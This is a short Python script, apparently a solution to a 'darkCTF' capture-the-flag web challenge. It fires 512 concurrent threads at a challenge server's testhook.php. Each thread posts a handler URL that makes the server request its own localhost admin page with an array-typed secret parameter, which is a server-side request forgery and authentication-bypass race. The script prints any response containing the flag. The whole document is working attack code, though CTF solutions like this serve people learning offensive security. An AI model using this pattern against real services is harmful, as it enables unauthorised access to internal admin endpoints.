import threading
import requests

for i in range(0x200):

    def login():
        s= {'handler':'http://127.0.0.1:8080/index.php?user=admin1212&secret[]'}
        url="http://race.darkarmy.xyz:8999/testhook.php"
        r=requests.post(url,data=s)
        if "darkCTF{" in r.content:
            print r.content
        
        exit(0) 
    threading.Thread(target=login).start()


